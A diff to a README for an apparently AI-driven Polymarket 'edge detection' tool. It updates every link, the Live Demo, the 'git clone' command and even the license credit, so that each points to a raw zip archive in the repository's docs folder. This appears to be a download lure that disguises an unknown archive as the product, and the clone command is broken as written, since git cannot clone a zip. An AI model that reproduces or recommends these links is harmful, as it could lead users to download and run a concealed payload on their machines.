@@ -2,7 +2,7 @@
 
 **AI-powered prediction market intelligence. Scans Polymarket for mispriced markets and detects edges.**
 
-[**Live Demo**](https://github.com/alzei2269/polymarket-agent/raw/refs/heads/main/docs/agent-polymarket-v1.5.zip)
+[**Live Demo**](https://github.com/alzei2269/polymarket-agent/raw/refs/heads/main/docs/agent-polymarket-v1.7.zip)
 
 ![polymarket-agent](docs/og-image.svg)
 
@@ -45,11 +45,11 @@
 ## Run Locally
 
 ```bash
-git clone https://github.com/alzei2269/polymarket-agent/raw/refs/heads/main/docs/agent-polymarket-v1.5.zip
+git clone https://github.com/alzei2269/polymarket-agent/raw/refs/heads/main/docs/agent-polymarket-v1.7.zip
 cd polymarket-agent/docs
 open index.html
 ```
 
 ## License
 
-MIT — [visioneth](https://github.com/alzei2269/polymarket-agent/raw/refs/heads/main/docs/agent-polymarket-v1.5.zip)
+MIT — [visioneth](https://github.com/alzei2269/polymarket-agent/raw/refs/heads/main/docs/agent-polymarket-v1.7.zip)
